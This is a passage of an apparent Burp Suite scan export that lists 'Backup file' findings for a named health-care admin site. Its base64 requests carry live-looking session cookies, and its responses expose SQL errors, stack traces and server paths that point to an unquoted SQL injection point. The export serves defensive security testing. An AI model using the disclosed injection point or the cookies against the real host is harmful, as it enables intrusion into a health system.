NoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPUJzRERZbjZJN0tobVBpaVJsRzNVRUtHM0tReW53VEhueE5uMFc3cGIrTWxUMmU5bE1ydERLaWZXcGRQUXdXb1Jab2hzM3FRSVd3VS9jTHg4S3YwRlBtRXZpWnpmZ1Zxd25tQnZEUlFMMndoRHFRb3Q5WXdTS2VTSVdhOVg7IEFXU0FMQkNPUlM9QnNERFluNkk3S2htUGlpUmxHM1VFS0czS1F5bndUSG54Tm4wVzdwYitNbFQyZTlsTXJ0REtpZldwZFBRd1dvUlpvaHMzcVFJV3dVL2NMeDhLdjBGUG1FdmlaemZnVnF3bm1CdkRSUUwyd2hEcVFvdDlZd1NLZVNJV2E5WA0KT3JpZ2luOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tDQpYLVJlcXVlc3RlZC1XaXRoOiBYTUxIdHRwUmVxdWVzdA0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyUHJvZmlsZS8zOTkNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04DQpTZWMtQ0gtVUE6ICIuTm90L0EpQnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjEzMSIsICJDaHJvbWl1bSI7dj0iMTMxIg0KU2VjLUNILVVBLVBsYXRmb3JtOiBXaW5kb3dzDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KQ29udGVudC1MZW5ndGg6IDc1DQoNClNhdmU9U2F2ZSZmaXJzdE5hbWU9WVlZJmxhc3ROYW1lPWN5cGFydGEmcGhvbmU9MDAwMDAwMDAwMCZlbnRyaWVzUGVyUGFnZT01MA==]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1OToyNyBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogNzA3DQpTZXQtQ29va2llOiBBV1NBTEI9Zi8xaWZCSXZaeXZPSG9BNERxMzVleG80cm0xeUFJVXNYVndXVjFFVUlWUm1vWFJtUkJhRG9wTWxFWHgrblZXVTNEYWRtS3NWSFhTM2tpZFliQUFCMzVtb0VqMTRvMExyZms3V20ycXUxMzYwU2YxTDJCU3RjaGo3dGM3bjsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU5OjI3IEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPWYvMWlmQkl2Wnl2T0hvQTREcTM1ZXhvNHJtMXlBSVVzWFZ3V1YxRVVJVlJtb1hSbVJCYURvcE1sRVh4K25WV1UzRGFkbUtzVkhYUzNraWRZYkFBQjM1bW9FajE0bzBMcmZrN1dtMnF1MTM2MFNmMUwyQlN0Y2hqN3RjN247IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1OToyNyBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogVW5rbm93biBjb2x1bW4gJ0NvcHknIGluICd3aGVyZSBjbGF1c2UnIGluIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwOjI0ClN0YWNrIHRyYWNlOgojMCAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocCgyNCk6IG15c3FsaS0mZ3Q7cXVlcnkoJ1NFTEVDVCAqIGZyb20gdS4uLicpCiMxIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvbW9kZWxzL1VzZXIucGhwKDE5NCk6IERiVXRpbDo6Z2V0U2VsZWN0UmVzdWx0KE9iamVjdChteXNxbGkpLCAnU0VMRUNUICogZnJvbSB1Li4uJykKIzIgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9jb250cm9sbGVyL1VzZXJQcm9maWxlQ29udHJvbGxlci5waHAoOTYpOiBVc2VyOjpnZXQoJzM5OSAtIENvcHknKQojMyAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2FkbWluL2luZGV4LnBocCgxMDMpOiBVc2VyUHJvZmlsZUNvbnRyb2xsZXItJmd0O3NhdmVFbnRpdHkoJzM5OSAtIENvcHknLCAnVXNlclByb2ZpbGUnLCBBcnJheSwgQXJyYXkpCiM0IHttYWlufQogIHRocm93biBpbiA8Yj4vdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocDwvYj4gb24gbGluZSA8Yj4yNDwvYj48YnIgLz4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvaWFoJTIwLSUyMENvcHkgSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiBhcHBsaWNhdGlvbi9qc29uLCB0ZXh0L2phdmFzY3JpcHQsICovKjsgcT0wLjAxDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuNjc3OC44NiBTYWZhcmkvNTM3LjM2DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ2FjaGUtQ29udHJvbDogbWF4LWFnZT0wDQpDb29raWU6IFBIUFNFU1NJRD1rYWo2MTBtMHJwZ3FxNGFpY3N1bWFnb2Y0czsgc2NyZWVuV2lkdGg9MTM2ODsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYXNoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPUJzRERZbjZJN0tobVBpaVJsRzNVRUtHM0tReW53VEhueE5uMFc3cGIrTWxUMmU5bE1ydERLaWZXcGRQUXdXb1Jab2hzM3FRSVd3VS9jTHg4S3YwRlBtRXZpWnpmZ1Zxd25tQnZEUlFMMndoRHFRb3Q5WXdTS2VTSVdhOVg7IEFXU0FMQkNPUlM9QnNERFluNkk3S2htUGlpUmxHM1VFS0czS1F5bndUSG54Tm4wVzdwYitNbFQyZTlsTXJ0REtpZldwZFBRd1dvUlpvaHMzcVFJV3dVL2NMeDhLdjBGUG1FdmlaemZnVnF3bm1CdkRSUUwyd2hEcVFvdDlZd1NLZVNJV2E5WA0KT3JpZ2luOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tDQpYLVJlcXVlc3RlZC1XaXRoOiBYTUxIdHRwUmVxdWVzdA0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyUHJvZmlsZS8zOTkNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04DQpTZWMtQ0gtVUE6ICIuTm90L0EpQnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjEzMSIsICJDaHJvbWl1bSI7dj0iMTMxIg0KU2VjLUNILVVBLVBsYXRmb3JtOiBXaW5kb3dzDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KQ29udGVudC1MZW5ndGg6IDc1DQoNClNhdmU9U2F2ZSZmaXJzdE5hbWU9WVlZJmxhc3ROYW1lPWN5cGFydGEmcGhvbmU9MDAwMDAwMDAwMCZlbnRyaWVzUGVyUGFnZT01MA==]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1OToyNyBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogNzA2DQpTZXQtQ29va2llOiBBV1NBTEI9TVlSdTYwLzZabTdXRlpVZmtwVXNFRUR2b0Z3RGhib1VCbzlNeWlWaHBpZnJmNUllUFdyY0ZEd2tOWDJZQmI4SWd0QUR1S3J2eElKbGFpVXJZNlJBNHVOUmdSS3lvb1hPRTJ0ZG51YmQxemdSOEVUZFJFTGxhZ2l0UlJtUTsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU5OjI3IEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPU1ZUnU2MC82Wm03V0ZaVWZrcFVzRUVEdm9Gd0RoYm9VQm85TXlpVmhwaWZyZjVJZVBXcmNGRHdrTlgyWUJiOElndEFEdUtydnhJSmxhaVVyWTZSQTR1TlJnUkt5b29YT0UydGRudWJkMXpnUjhFVGRSRUxsYWdpdFJSbVE7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1OToyNyBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogVW5rbm93biBjb2x1bW4gJ2lhaCcgaW4gJ3doZXJlIGNsYXVzZScgaW4gL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS91dGlsL2RiVXRpbC5waHA6MjQKU3RhY2sgdHJhY2U6CiMwIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwKDI0KTogbXlzcWxpLSZndDtxdWVyeSgnU0VMRUNUICogZnJvbSB1Li4uJykKIzEgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS9tb2RlbHMvVXNlci5waHAoMTk0KTogRGJVdGlsOjpnZXRTZWxlY3RSZXN1bHQoT2JqZWN0KG15c3FsaSksICdTRUxFQ1QgKiBmcm9tIHUuLi4nKQojMiAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2FkbWluL2NvbnRyb2xsZXIvVXNlclByb2ZpbGVDb250cm9sbGVyLnBocCg5Nik6IFVzZXI6OmdldCgnaWFoIC0gQ29weScpCiMzIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvYWRtaW4vaW5kZXgucGhwKDEwMyk6IFVzZXJQcm9maWxlQ29udHJvbGxlci0mZ3Q7c2F2ZUVudGl0eSgnaWFoIC0gQ29weScsICdVc2VyUHJvZmlsZScsIEFycmF5LCBBcnJheSkKIzQge21haW59CiAgdGhyb3duIGluIDxiPi92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwPC9iPiBvbiBsaW5lIDxiPjI0PC9iPjxiciAvPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2886341479174018048</serialNumber>
    <type>6291672</type>
    <name><![CDATA[Backup file]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399]]></path>
    <location><![CDATA[/UserProfile/399%20-%20Copy%20(2)]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Publicly accessible backups and outdated copies of files can provide attackers with extra attack surface. Depending on the server configuration and file type, they may also expose source code, configuration details, and other information intended to remain secret.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Review the file to identify whether it's intended to be publicly accessible, and remove it from the server's web root if it isn't. It may also be worth auditing the server contents to find other outdated files, and taking measures to prevent the problem from reoccurring. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/information-disclosure/exploiting#source-code-disclosure-via-backup-files">Web Security Academy: Information disclosure via backup files</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/530.html">CWE-530: Exposure of Backup File to an Unauthorized Control Sphere</a></li><li><a href="https://capec.mitre.org/data/definitions/37.html">CAPEC-37: Retrieve Embedded Sensitive Data</a></li><li><a href="https://capec.mitre.org/data/definitions/204.html">CAPEC-204: Lifting Sensitive Data Embedded in Cache</a></li></ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvMzk5JTIwLSUyMENvcHklMjAoMikgSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiBhcHBsaWNhdGlvbi9qc29uLCB0ZXh0L2phdmFzY3JpcHQsICovKjsgcT0wLjAxDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuNjc3OC44NiBTYWZhcmkvNTM3LjM2DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ2FjaGUtQ29udHJvbDogbWF4LWFnZT0wDQpDb29raWU6IFBIUFNFU1NJRD1rYWo2MTBtMHJwZ3FxNGFpY3N1bWFnb2Y0czsgc2NyZWVuV2lkdGg9MTM2ODsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYXNoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPUJzRERZbjZJN0tobVBpaVJsRzNVRUtHM0tReW53VEhueE5uMFc3cGIrTWxUMmU5bE1ydERLaWZXcGRQUXdXb1Jab2hzM3FRSVd3VS9jTHg4S3YwRlBtRXZpWnpmZ1Zxd25tQnZEUlFMMndoRHFRb3Q5WXdTS2VTSVdhOVg7IEFXU0FMQkNPUlM9QnNERFluNkk3S2htUGlpUmxHM1VFS0czS1F5bndUSG54Tm4wVzdwYitNbFQyZTlsTXJ0REtpZldwZFBRd1dvUlpvaHMzcVFJV3dVL2NMeDhLdjBGUG1FdmlaemZnVnF3bm1CdkRSUUwyd2hEcVFvdDlZd1NLZVNJV2E5WA0KT3JpZ2luOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tDQpYLVJlcXVlc3RlZC1XaXRoOiBYTUxIdHRwUmVxdWVzdA0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyUHJvZmlsZS8zOTkNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04DQpTZWMtQ0gtVUE6ICIuTm90L0EpQnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjEzMSIsICJDaHJvbWl1bSI7dj0iMTMxIg0KU2VjLUNILVVBLVBsYXRmb3JtOiBXaW5kb3dzDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KQ29udGVudC1MZW5ndGg6IDc1DQoNClNhdmU9U2F2ZSZmaXJzdE5hbWU9WVlZJmxhc3ROYW1lPWN5cGFydGEmcGhvbmU9MDAwMDAwMDAwMCZlbnRyaWVzUGVyUGFnZT01MA==]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1OToyNyBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogNzIxDQpTZXQtQ29va2llOiBBV1NBTEI9V0crR1RncXdlb2FxaTluKzVkT0xUVzlCOTB6RlhDY1BhcEZxMWFIVFNoQTduczdtaDd0cHRNUFloVlVSanV0Um5ZNHE3MTU4d3NhbHJSZ29uVzlhOVY3UDIyZzdmV0ZUSlFVVzdRZWNEYjkwRUsweFFFS2puelcyK0dQRTsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU5OjI3IEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPVdHK0dUZ3F3ZW9hcWk5bis1ZE9MVFc5QjkwekZYQ2NQYXBGcTFhSFRTaEE3bnM3bWg3dHB0TVBZaFZVUmp1dFJuWTRxNzE1OHdzYWxyUmdvblc5YTlWN1AyMmc3ZldGVEpRVVc3UWVjRGI5MEVLMHhRRUtqbnpXMitHUEU7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1OToyNyBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogRlVOQ1RJT04gbWlyYWRvcl9pbnNpZ2h0cy5Db3B5IGRvZXMgbm90IGV4aXN0IGluIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwOjI0ClN0YWNrIHRyYWNlOgojMCAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocCgyNCk6IG15c3FsaS0mZ3Q7cXVlcnkoJ1NFTEVDVCAqIGZyb20gdS4uLicpCiMxIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvbW9kZWxzL1VzZXIucGhwKDE5NCk6IERiVXRpbDo6Z2V0U2VsZWN0UmVzdWx0KE9iamVjdChteXNxbGkpLCAnU0VMRUNUICogZnJvbSB1Li4uJykKIzIgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9jb250cm9sbGVyL1VzZXJQcm9maWxlQ29udHJvbGxlci5waHAoOTYpOiBVc2VyOjpnZXQoJzM5OSAtIENvcHkgKDIpJykKIzMgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9pbmRleC5waHAoMTAzKTogVXNlclByb2ZpbGVDb250cm9sbGVyLSZndDtzYXZlRW50aXR5KCczOTkgLSBDb3B5ICgyKScsICdVc2VyUHJvZmlsZScsIEFycmF5LCBBcnJheSkKIzQge21haW59CiAgdGhyb3duIGluIDxiPi92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwPC9iPiBvbiBsaW5lIDxiPjI0PC9iPjxiciAvPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvcXZyJTIwLSUyMENvcHklMjAoMikgSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiBhcHBsaWNhdGlvbi9qc29uLCB0ZXh0L2phdmFzY3JpcHQsICovKjsgcT0wLjAxDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuNjc3OC44NiBTYWZhcmkvNTM3LjM2DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ2FjaGUtQ29udHJvbDogbWF4LWFnZT0wDQpDb29raWU6IFBIUFNFU1NJRD1rYWo2MTBtMHJwZ3FxNGFpY3N1bWFnb2Y0czsgc2NyZWVuV2lkdGg9MTM2ODsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYXNoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPUJzRERZbjZJN0tobVBpaVJsRzNVRUtHM0tReW53VEhueE5uMFc3cGIrTWxUMmU5bE1ydERLaWZXcGRQUXdXb1Jab2hzM3FRSVd3VS9jTHg4S3YwRlBtRXZpWnpmZ1Zxd25tQnZEUlFMMndoRHFRb3Q5WXdTS2VTSVdhOVg7IEFXU0FMQkNPUlM9QnNERFluNkk3S2htUGlpUmxHM1VFS0czS1F5bndUSG54Tm4wVzdwYitNbFQyZTlsTXJ0REtpZldwZFBRd1dvUlpvaHMzcVFJV3dVL2NMeDhLdjBGUG1FdmlaemZnVnF3bm1CdkRSUUwyd2hEcVFvdDlZd1NLZVNJV2E5WA0KT3JpZ2luOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tDQpYLVJlcXVlc3RlZC1XaXRoOiBYTUxIdHRwUmVxdWVzdA0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyUHJvZmlsZS8zOTkNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04DQpTZWMtQ0gtVUE6ICIuTm90L0EpQnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjEzMSIsICJDaHJvbWl1bSI7dj0iMTMxIg0KU2VjLUNILVVBLVBsYXRmb3JtOiBXaW5kb3dzDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KQ29udGVudC1MZW5ndGg6IDc1DQoNClNhdmU9U2F2ZSZmaXJzdE5hbWU9WVlZJmxhc3ROYW1lPWN5cGFydGEmcGhvbmU9MDAwMDAwMDAwMCZlbnRyaWVzUGVyUGFnZT01MA==]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1OToyOCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogNzE0DQpTZXQtQ29va2llOiBBV1NBTEI9TFlPVlIrUE5LSFlnUndTc1JadnlZNXIrN2JUdHI0ZWd3UkpjbVY5UFR0TCtodVJoek5KODd3anRQZUF1UEdUOGZUMUllREtzUHNCcUZoY3l1a0xLa0NURy9NVUpVajlNcDJldi9uYndRSnhaZ1E2dnlqc0RtQzY3Z0k5VDsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU5OjI4IEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPUxZT1ZSK1BOS0hZZ1J3U3NSWnZ5WTVyKzdiVHRyNGVnd1JKY21WOVBUdEwraHVSaHpOSjg3d2p0UGVBdVBHVDhmVDFJZURLc1BzQnFGaGN5dWtMS2tDVEcvTVVKVWo5TXAyZXYvbmJ3UUp4WmdRNnZ5anNEbUM2N2dJOVQ7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1OToyOCBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogVW5rbm93biBjb2x1bW4gJ3F2cicgaW4gJ3doZXJlIGNsYXVzZScgaW4gL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS91dGlsL2RiVXRpbC5waHA6MjQKU3RhY2sgdHJhY2U6CiMwIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwKDI0KTogbXlzcWxpLSZndDtxdWVyeSgnU0VMRUNUICogZnJvbSB1Li4uJykKIzEgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS9tb2RlbHMvVXNlci5waHAoMTk0KTogRGJVdGlsOjpnZXRTZWxlY3RSZXN1bHQoT2JqZWN0KG15c3FsaSksICdTRUxFQ1QgKiBmcm9tIHUuLi4nKQojMiAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2FkbWluL2NvbnRyb2xsZXIvVXNlclByb2ZpbGVDb250cm9sbGVyLnBocCg5Nik6IFVzZXI6OmdldCgncXZyIC0gQ29weSAoMiknKQojMyAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2FkbWluL2luZGV4LnBocCgxMDMpOiBVc2VyUHJvZmlsZUNvbnRyb2xsZXItJmd0O3NhdmVFbnRpdHkoJ3F2ciAtIENvcHkgKDIpJywgJ1VzZXJQcm9maWxlJywgQXJyYXksIEFycmF5KQojNCB7bWFpbn0KICB0aHJvd24gaW4gPGI+L3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS91dGlsL2RiVXRpbC5waHA8L2I+IG9uIGxpbmUgPGI+MjQ8L2I+PGJyIC8+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5903635380148857856</serialNumber>
    <type>6291672</type>
    <name><![CDATA[Backup file]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399]]></path>
    <location><![CDATA[/UserProfile/399%20-%20Copy%20-%20Copy]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Publicly accessible backups and outdated copies of files can provide attackers with extra attack surface. Depending on the server configuration and file type, they may also expose source code, configuration details, and other information intended to remain secret.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Review the file to identify whether it's intended to be publicly accessible, and remove it from the server's web root if it isn't. It may also be worth auditing the server contents to find other outdated files, and taking measures to prevent the problem from reoccurring. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/information-disclosure/exploiting#source-code-disclosure-via-backup-files">Web Security Academy: Information disclosure via backup files</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/530.html">CWE-530: Exposure of Backup File to an Unauthorized Control Sphere</a></li><li><a href="https://capec.mitre.org/data/definitions/37.html">CAPEC-37: Retrieve Embedded Sensitive Data</a></li><li><a href="https://capec.mitre.org/data/definitions/204.html">CAPEC-204: Lifting Sensitive Data Embedded in Cache</a></li></ul>]]></vulnerabilityClassifications>
    <requestresponse>
